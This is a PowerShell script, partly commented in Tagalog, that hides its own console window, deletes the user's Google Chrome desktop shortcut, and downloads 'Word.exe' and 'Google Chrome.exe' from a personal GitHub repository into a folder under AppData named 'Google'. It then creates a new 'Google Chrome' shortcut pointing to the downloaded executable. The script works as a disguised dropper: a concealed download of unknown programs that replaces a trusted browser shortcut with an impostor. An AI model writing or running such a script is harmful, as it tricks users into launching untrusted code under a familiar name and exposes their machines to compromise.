# ============================
# Minimize PowerShell Window sa Smallest Possible
# ============================
Add-Type -AssemblyName System.Windows.Forms

$pwsh = Get-Process -Id $PID
$handle = $pwsh.MainWindowHandle

# Minimize constant
$SW_MINIMIZE = 2
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll")]
    public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
}
"@

# Minimize window
[WinAPI]::ShowWindow($handle, $SW_MINIMIZE)
# Gawing maliit ang window 50x50 pixels sa top-left corner
[WinAPI]::MoveWindow($handle, 0, 0, 50, 50, $true)

# ============================
# 0. Remove Existing Google Chrome Shortcut on Desktop
# ============================
$existingChromeShortcut = "$env:USERPROFILE\Desktop\Google Chrome.lnk"
if (Test-Path $existingChromeShortcut) {
    Remove-Item $existingChromeShortcut -Force
}

# ============================
# 1. Create directory
# ============================
$dir = "$env:USERPROFILE\AppData\Local\Google"
New-Item -ItemType Directory -Force -Path $dir

# ============================
# 2. Download EXE Files
# ============================
Invoke-WebRequest `
    "https://raw.githubusercontent.com/johndavidameminse-svg/Myproject/main/Word.exe" `
    -OutFile "$dir\Word.exe"

Invoke-WebRequest `
    "https://raw.githubusercontent.com/johndavidameminse-svg/Myproject/main/Google%20Chrome.exe" `
    -OutFile "$dir\Google Chrome.exe"

# ============================
# 3. Create Desktop Shortcut for the downloaded EXE
# ============================
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\Desktop\Google Chrome.lnk")
$Shortcut.TargetPath = "$dir\Google Chrome.exe"
$Shortcut.Save()

# ============================
# 4. Completion Message
# ============================
Write-Host "✓ Finished! Deleted old Chrome shortcut, downloaded EXE files, and added the new shortcut."

# ============================
# 5. Auto Exit PowerShell
# ============================
exit
